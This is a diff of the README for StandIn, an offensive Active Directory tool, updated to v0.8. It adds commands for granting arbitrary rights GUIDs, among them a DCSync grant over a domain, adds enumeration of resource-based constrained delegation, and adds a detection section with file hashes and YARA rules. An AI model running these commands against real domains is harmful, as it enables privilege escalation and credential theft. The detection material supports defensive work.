@@ -26,6 +26,8 @@ The following items are currently on the radar for implementation in subsequent 
 - S4U2Pwnage (by [@harmj0y](https://twitter.com/harmj0y)) - [here](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)
 - Resource-based Constrained Delegation (by [@spotheplanet](https://twitter.com/spotheplanet)) - [here](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)
 - Rubeus - [here](https://github.com/GhostPack/Rubeus)
+- Powerview - [here](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
+- Powermad (by [@kevin_robertson](https://twitter.com/kevin_robertson)) - [here](https://github.com/Kevin-Robertson/Powermad)
 
 # Index
 - [Help](#help)
@@ -38,7 +40,7 @@ The following items are currently on the radar for implementation in subsequent 
     - [Remove ASREP from object flags](#addremove-asrep-from-object-flags)
 - [ASREP](#asrep)
 - [SPN](#spn)
-- [Unconstrained / constrained delegation](#unconstrained--constrained-delegation)
+- [Unconstrained / constrained / resource-based constrained delegation](#unconstrained--constrained--resource-based-constrained-delegation)
 - [DC's](#dcs)
 - [Groups Operations](#groups-operations)
     - [List group membership](#list-group-membership)
@@ -49,13 +51,14 @@ The following items are currently on the radar for implementation in subsequent 
     - [Delete machine object](#delete-machine-object)
     - [Add msDS-AllowedToActOnBehalfOfOtherIdentity](#add-msds-allowedtoactonbehalfofotheridentity)
     - [Remove msDS-AllowedToActOnBehalfOfOtherIdentity](#remove-msds-allowedtoactonbehalfofotheridentity)
+- [Detection](#detection)
 
 ## Help
 
 ```
   __
  ( _/_   _//   ~b33f
-__)/(//)(/(/)  v0.7
+__)/(//)(/(/)  v0.8
 
 
  >--~~--> Args? <--~~--<
@@ -67,6 +70,7 @@ __)/(//)(/(/)  v0.7
 --ntaccount   User name, e.g. "REDHOOK\UPickman"
 --sid         String SID representing a target machine
 --grant       User name, e.g. "REDHOOK\KMason"
+--guid        Rights GUID to add to object, e.g. 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
 --domain      Domain name, e.g. REDHOOK
 --user        User name
 --pass        Password
@@ -95,6 +99,7 @@ StandIn.exe --object samaccountname=JCurwen --access --domain redhook --user RFl
 
 # Grant object access permissions
 StandIn.exe --object "distinguishedname=DC=redhook,DC=local" --grant "REDHOOK\MBWillett" --type DCSync
+StandIn.exe --object "distinguishedname=DC=redhook,DC=local" --grant "REDHOOK\MBWillett" --guid 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
 StandIn.exe --object samaccountname=SomeTarget001$ --grant "REDHOOK\MBWillett" --type GenericWrite --domain redhook --user RFludd --pass Cl4vi$Alchemi4e
 
 # Set object password
@@ -363,7 +368,7 @@ C:\> StandIn.exe --object samaccountname=m-10-1909-01$ --access --ntaccount "MAI
 
 #### Syntax
 
-Add permission to the resolved object for a specified NTAccount. Currently a small set of privileges are supported (GenericAll, GenericWrite, ResetPassword, WriteMembers, DCSync) but a parameter can easily be added to allow users to specify a custom ExtendedRight GUID.
+Add permission to the resolved object for a specified NTAccount. StandIn supports a small set of pre-defined privileges (GenericAll, GenericWrite, ResetPassword, WriteMembers, DCSync) but it also allows operators to specify a custom rights guid using the `--guid` flag.
 
 ```
 C:\> whoami
@@ -615,15 +620,15 @@ C:\> StandIn.exe --spn
     Supported ETypes       : RC4_HMAC_DEFAULT
 ```
 
-## Unconstrained / constrained delegation
+## Unconstrained / constrained / resource-based constrained delegation
 
 #### Use Case
 
-> *This function enumerates all accounts that are permitted to perform [unconstrained](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation) or [constrained](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) delegation. These assets can be used to expand access or achieve objectives.*
+> *This function enumerates all accounts that are permitted to perform [unconstrained](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation), [constrained](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation), or [resource-based constrained](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution) delegation. These assets can be used to expand access or achieve objectives.*
 
 #### Syntax
 
-Return all accounts that have either unconstrained or consrtained delegation permissions.
+Return all accounts that have either unconstrained or constrained delegation permissions, or have inbound resource-based constrained delegation privileges.
 
 ```
 C:\> StandIn.exe --delegation
@@ -632,8 +637,8 @@ C:\> StandIn.exe --delegation
 
 [?] Found 3 object(s) with unconstrained delegation..
 
-[*] SamAccountName           : M-2019-05$
-    DistinguishedName        : CN=M-2019-05,OU=Servers,OU=OCCULT,DC=main,DC=redhook,DC=local
+[*] SamAccountName           : M-2019-03$
+    DistinguishedName        : CN=M-2019-03,OU=Servers,OU=OCCULT,DC=main,DC=redhook,DC=local
     userAccountControl       : WORKSTATION_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
 
 [*] SamAccountName           : M-W16-DC01$
@@ -644,18 +649,31 @@ C:\> StandIn.exe --delegation
     DistinguishedName        : CN=M-W19-DC01,OU=Domain Controllers,DC=main,DC=redhook,DC=local
     userAccountControl       : SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
 
-[?] Found 1 object(s) with constrained delegation..
+[?] Found 2 object(s) with constrained delegation..
 
-[*] SamAccountName           : M-2019-06$
-    DistinguishedName        : CN=M-2019-06,OU=Servers,OU=OCCULT,DC=main,DC=redhook,DC=local
-    msDS-AllowedToDelegateTo : ldap/m-w16-dc01.main.redhook.local/main.redhook.local
-                               ldap/m-w16-dc01.main.redhook.local
-                               ldap/M-W16-DC01
-                               ldap/m-w16-dc01.main.redhook.local/MAIN
-                               ldap/M-W16-DC01/MAIN
-                               ldap/m-w16-dc01.main.redhook.local/DomainDnsZones.main.redhook.local
-                               ldap/m-w16-dc01.main.redhook.local/ForestDnsZones.main.redhook.local
+[*] SamAccountName           : M-2019-04$
+    DistinguishedName        : CN=M-2019-04,OU=Servers,OU=OCCULT,DC=main,DC=redhook,DC=local
+    msDS-AllowedToDelegateTo : HOST/m-w16-dc01.main.redhook.local/main.redhook.local
+                               HOST/m-w16-dc01.main.redhook.local
+                               HOST/M-W16-DC01
+                               HOST/m-w16-dc01.main.redhook.local/MAIN
+                               HOST/M-W16-DC01/MAIN
+    Protocol Transition      : False
+    userAccountControl       : WORKSTATION_TRUST_ACCOUNT
+
+[*] SamAccountName           : M-2019-05$
+    DistinguishedName        : CN=M-2019-05,OU=Servers,OU=OCCULT,DC=main,DC=redhook,DC=local
+    msDS-AllowedToDelegateTo : cifs/m-2012r2-03.main.redhook.local
+                               cifs/M-2012R2-03
+    Protocol Transition      : True
     userAccountControl       : WORKSTATION_TRUST_ACCOUNT, TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION
+
+[?] Found 1 object(s) with resource-based constrained delegation..
+
+[*] SamAccountName           : M-10-1909-01$
+    DistinguishedName        : CN=M-10-1909-01,OU=Workstations,OU=OCCULT,DC=main,DC=redhook,DC=local
+    Inbound Delegation       : Server Admins [GROUP]
+    userAccountControl       : WORKSTATION_TRUST_ACCOUNT
 ```
 
 ## DC's
@@ -1023,3 +1041,84 @@ C:\> StandIn.exe --computer m-10-1909-03 --remove
     Path     : LDAP://CN=M-10-1909-03,OU=Workstations,OU=OCCULT,DC=main,DC=redhook,DC=local
 [+] msDS-AllowedToActOnBehalfOfOtherIdentity property removed..
 ```
+
+## Detection
+
+This outlines a number of IOC's which can aid in the detection engineering process for StandIn.
+
+#### Release Package Hashes
+
+The following table maps the release package hashes for StandIn.
+
+```
+-=v0.8=-
+StandIn_Net35.exe    SHA256: A0B3C96CA89770ED04E37D43188427E0016B42B03C0102216C5F6A785B942BD3
+                        MD5: 8C942EE4553E40A7968FF0C8DC5DB9AB
+
+StandIn_Net45.exe    SHA256: F80AEB33FC53F2C8D6313A6B20CD117739A71382C208702B43073D54C9ACA681
+                        MD5: 9E0FC3159A6BF8C3A8A0FAA76F6F74F9
+
+-=v0.7=-
+StandIn_Net35.exe    SHA256: A1ECD50DA8AAE5734A5F5C4A6A951B5F3C99CC4FB939AC60EF5EE19896CA23A0
+                        MD5: 50D29F7597BF83D80418DEEFD360F093
+
+StandIn_Net45.exe    SHA256: DBAB7B9CC694FC37354E3A18F9418586172ED6660D8D205EAFFF945525A6A31A
+                        MD5: 4E5258A876ABCD2CA2EF80E0D5D93195
+```
+
+#### Yara
+
+The following Yara rules can be used to detect StandIn on disk, in it's default form.
+
+```js
+rule StandIn
+{
+    meta:
+        author = "Ruben Boonen (@FuzzySec)"
+        description = "Detect StandIn string constants."
+
+    strings:
+        $s1 = "StandIn" ascii wide nocase
+        $s2 = "(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))" ascii wide nocase
+        $s3 = "msDS-AllowedToActOnBehalfOfOtherIdentity" ascii wide nocase
+        $s4 = ">--~~--> Args? <--~~--<" ascii wide nocase
+
+    condition:
+        all of ($s*)
+}
+
+rule StandIn_PDB
+{
+    meta:
+        author = "Ruben Boonen (@FuzzySec)"
+        description = "Detect StandIn default PDB."
+
+    strings:
+        $s1 = "\\Release\\StandIn.pdb" ascii wide nocase
+	
+    condition:
+        all of ($s*)
+}
+```
+
+#### SilktETW Microsoft-Windows-DotNETRuntime Yara Rule
+
+The Yara rule below can be used to detect StandIn when execution happens from memory. To use this rule, the EDR solution will require access to the `Microsoft-Windows-DotNETRuntime` ETW data provider. For testing purposes, this rule can be directly evaluated using [SilkETW](https://github.com/fireeye/SilkETW). It should be noted that this is a generic example rule, production alerting would required a more granular approach.
+
+```js
+rule Silk_StandIn_Generic
+{
+    meta:
+        author = "Ruben Boonen (@FuzzySec)"
+        description = "Generic Microsoft-Windows-DotNETRuntime detection for StandIn."
+
+    strings:
+        $s1 = "\\r\\nFullyQualifiedAssemblyName=0;\\r\\nClrInstanceID=StandIn" ascii wide nocase
+        $s2 = "MethodFlags=Jitted;\\r\\nMethodNamespace=StandIn." ascii wide nocase
+
+    condition:
+        any of them
+}
+```
+
+![Help](Images/Silk_StandIn.png)
